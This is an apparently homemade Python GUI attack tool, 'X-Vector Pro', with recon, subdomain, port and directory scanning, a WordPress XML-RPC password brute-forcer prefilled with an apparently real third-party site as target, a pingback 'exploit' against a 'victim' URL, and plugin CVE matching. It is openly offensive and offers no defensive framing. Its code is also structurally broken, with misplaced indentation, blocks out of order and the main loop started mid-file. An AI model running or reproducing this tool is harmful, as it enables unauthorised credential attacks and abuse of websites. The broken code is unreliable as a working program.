import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import socket
from queue import Queue
import json
# === Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

# === Tabbed Layout ===
tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# === Add Tabs ===
recon_tab = tabs.add("Recon")
scanner_tab = tabs.add("Scanner")
brute_tab = tabs.add("Brute Force")
exploit_tab = tabs.add("Exploits")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# =====================
# === BRUTE FORCE TAB
# =====================
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

import xmlrpc.client  # moved up for logic reuse

ctk.CTkLabel(brute_tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(brute_tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(brute_tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(brute_tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(brute_tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(brute_tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(brute_tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, height=200, width=700)
log_box.pack()

# ==========================
# === RECON TAB
# ==========================
import socket
import requests
import tldextract

def run_recon():
    target = recon_url_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a target URL.")
        return

    recon_output.delete("0.0", "end")
    recon_output.insert("end", f"[*] Starting recon on {target}...\n")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X-Vector Recon Bot)"
        }
        r = requests.get(target, headers=headers, timeout=10)

        # Server Headers
        recon_output.insert("end", "\n--- Headers ---\n")
        for key, value in r.headers.items():
            recon_output.insert("end", f"{key}: {value}\n")

        # Title
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            recon_output.insert("end", f"\n[*] Title: {title}\n")

        # CMS Detection
        recon_output.insert("end", "\n--- CMS Detection ---\n")
        if "wp-content" in r.text or "/wp-login.php" in r.text:
            recon_output.insert("end", "[+] WordPress Detected\n")
        elif "Joomla!" in r.text:
            recon_output.insert("end", "[+] Joomla Detected\n")
        elif "Drupal" in r.text:
            recon_output.insert("end", "[+] Drupal Detected\n")
        else:
            recon_output.insert("end", "[-] CMS Not Identified\n")

        # IP + Domain Info
        extracted = tldextract.extract(target)
        base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)
        ip = requests.get(f"https://dns.google/resolve?name={base_domain}&type=A").json()
        if "Answer" in ip:
            ip_addr = ip["Answer"][0]["data"]
            recon_output.insert("end", f"\n[*] IP Address: {ip_addr}\n")

    except Exception as e:
        recon_output.insert("end", f"[!] Recon failed: {e}\n")
def subdomain_scan():
    domain = recon_url_entry.get().strip()
    if not domain:
        messagebox.showerror("Error", "Enter a target domain.")
        return

    recon_output.insert("end", "\n[*] Starting subdomain scan...\n")

    wordlist = [
        "admin", "dev", "mail", "webmail", "test", "vpn", "portal",
        "beta", "staging", "api", "cpanel", "dashboard", "internal"
    ]

    # extract clean domain
    extracted = tldextract.extract(domain)
    base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)

    found = 0
    for sub in wordlist:
        subdomain = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            recon_output.insert("end", f"[+] Found: {subdomain} -> {ip}\n")
            found += 1
        except socket.gaierror:
            pass  # not resolved

    if found == 0:
        recon_output.insert("end", "[-] No subdomains found.\n")
    else:
        recon_output.insert("end", f"[*] Subdomain scan complete: {found} found\n")
# === Recon UI Layout ===
ctk.CTkLabel(recon_tab, text="Target URL (https://example.com)").pack(pady=5)
recon_url_entry = ctk.CTkEntry(recon_tab, width=700)
recon_url_entry.pack()
ctk.CTkButton(recon_tab, text="Scan Subdomains", command=lambda: threading.Thread(target=subdomain_scan).start()).pack(pady=5)
ctk.CTkButton(recon_tab, text="Run Recon", command=lambda: threading.Thread(target=run_recon).start()).pack(pady=10)

recon_output = ctk.CTkTextbox(recon_tab, height=400, width=800)
recon_output.pack()
# === Start GUI ===
app.mainloop()
# ==================
# ===  PORT SCAN TAB
# ==================
def run_port_scan():
    target = scanner_target_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a valid target IP or domain.")
        return

    scanner_output.delete("0.0", "end")
    scanner_output.insert("end", f"[*] Starting port scan on {target}...\n")
ctk.CTkButton(scanner_tab, text="Start Dir Scan", command=lambda: threading.Thread(target=run_dir_scan).start()).pack(pady=5)
    def scan_worker():
        while not q.empty():
            port = q.get()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((target, port))
                    if result == 0:
                        scanner_output.insert("end", f"[+] Port {port} is open\n")
            except Exception as e:
                scanner_output.insert("end", f"[-] Error on port {port}: {e}\n")
            q.task_done()

    # Common 100 ports
    top_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
        3306, 3389, 5900, 8080, 8443, 8888, 8000, 8081, 8880, 10000, 9200, 5432,
        389, 137, 138, 139, 2049, 1521, 465, 993, 995, 1025, 49152, 49153
    ]

    q = Queue()
    for port in top_ports:
        q.put(port)

    thread_count = 100
    for _ in range(thread_count):
        t = threading.Thread(target=scan_worker, daemon=True)
        t.start()

    q.join()
    scanner_output.insert("end", "[*] Port scan finished.\n")
    ctk.CTkLabel(scanner_tab, text="Target IP or Domain").pack(pady=5)
scanner_target_entry = ctk.CTkEntry(scanner_tab, width=500)
scanner_target_entry.pack()

ctk.CTkButton(scanner_tab, text="Start Port Scan", command=lambda: threading.Thread(target=run_port_scan).start()).pack(pady=10)

scanner_output = ctk.CTkTextbox(scanner_tab, height=400, width=800)
scanner_output.pack()

# =================
# === Dirbuster TAB
# ==================

def run_dir_scan():
    url = scanner_target_entry.get().strip().rstrip("/")
    if not url.startswith("http"):
        messagebox.showerror("Error", "Use full URL (http/https).")
        return

    scanner_output.insert("end", "\n[*] Starting directory scan...\n")

    wordlist = [
        "admin", "login", "dashboard", "config", "backup", "wp-admin",
        "uploads", "includes", "panel", "cpanel", "private", "hidden", "db", "phpmyadmin"
    ]

    def scan_path(path):
        full_url = f"{url}/{path}"
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code in [200, 301, 403]:
                scanner_output.insert("end", f"[+] {full_url} [{r.status_code}]\n")
        except Exception:
            pass

    threads = []
    for path in wordlist:
        t = threading.Thread(target=scan_path, args=(path,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    scanner_output.insert("end", "[*] Dir scan finished.\n")

# ===============
# === Exploit TAB
# ===============
from urllib.parse import urljoin
import re
import xmlrpc.client
def run_pingback_exploit():
    xmlrpc_url = exploit_target_entry.get().strip()
    victim_url = exploit_victim_entry.get().strip()

    if not xmlrpc_url or not victim_url:
        messagebox.showerror("Error", "Fill in both target and victim URLs.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")

    try:
        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
        result = proxy.pingback.ping(victim_url, xmlrpc_url)
        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
    except xmlrpc.client.Fault as fault:
        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
    except Exception as e:
        exploit_output.insert("end", f"[!] Error: {e}\n")
ctk.CTkLabel(exploit_tab, text="Target XML-RPC URL").pack(pady=5)
exploit_target_entry = ctk.CTkEntry(exploit_tab, width=700)
exploit_target_entry.insert(0, "https://example.com/xmlrpc.php")
exploit_target_entry.pack()

ctk.CTkLabel(exploit_tab, text="Victim URL to Ping").pack(pady=5)
exploit_victim_entry = ctk.CTkEntry(exploit_tab, width=700)
exploit_victim_entry.insert(0, "http://victim.com")
exploit_victim_entry.pack()

ctk.CTkButton(exploit_tab, text="Launch Pingback Exploit",
              command=lambda: threading.Thread(target=run_pingback_exploit).start()).pack(pady=10)

exploit_output = ctk.CTkTextbox(exploit_tab, height=300, width=800)
exploit_output.pack()
def run_wp_asset_enum():
    url = exploit_target_entry.get().strip()
    if not url.startswith("http"):
        messagebox.showerror("Error", "Enter a valid WordPress URL (with http/https).")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Scanning {url} for plugins and themes...\n")

    try:
        r = requests.get(url, timeout=10)
        html = r.text

        # Detect Plugins
        plugin_matches = re.findall(r'/wp-content/plugins/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        plugin_set = {match[0] for match in plugin_matches}

        # Detect Themes
        theme_matches = re.findall(r'/wp-content/themes/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        theme_set = {match[0] for match in theme_matches}

        if plugin_set:
            exploit_output.insert("end", "\n[+] Plugins Found:\n")
            for plugin in plugin_set:
                version = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {plugin} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {plugin}\n")
        else:
            exploit_output.insert("end", "[-] No plugins found.\n")

        if theme_set:
            exploit_output.insert("end", "\n[+] Themes Found:\n")
            for theme in theme_set:
                version = re.search(rf'/wp-content/themes/{theme}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {theme} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {theme}\n")
        else:
            exploit_output.insert("end", "[-] No themes found.\n")

    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to scan: {e}\n")
        ctk.CTkButton(exploit_tab, text="Scan Plugins & Themes",
              command=lambda: threading.Thread(target=run_wp_asset_enum).start()).pack(pady=5)
        def match_vulnerabilities():
    try:
        with open("cve_db.json", "r") as f:
            vuln_db = json.load(f)
    except Exception as e:
        exploit_output.insert("end", f"[!] Could not load CVE DB: {e}\n")
        return

    exploit_output.insert("end", "\n[*] Matching detected assets against CVE DB...\n")

    url = exploit_target_entry.get().strip()
    try:
        r = requests.get(url, timeout=10)
        html = r.text
    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to fetch target HTML: {e}\n")
        return

    # Match Plugins
    for plugin in vuln_db:
        if f"/wp-content/plugins/{plugin}" in html:
            version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
            if version_match:
                version = version_match.group(1)
                if version in vuln_db[plugin]:
                    vuln = vuln_db[plugin][version]
                    exploit_output.insert("end", f"[+] {plugin} v{version} is VULNERABLE!\n")
                    exploit_output.insert("end", f"    - {vuln['cve']}: {vuln['desc']}\n")
                else:
                    exploit_output.insert("end", f"[-] {plugin} v{version} found — no vuln match.\n")
            else:
                exploit_output.insert("end", f"[*] {plugin} detected — version unknown.\n")
ctk.CTkButton(exploit_tab, text="Check for CVEs",
              command=lambda: threading.Thread(target=match_vulnerabilities).start()).pack(pady=5)
    # Match Themes — can expand the same way
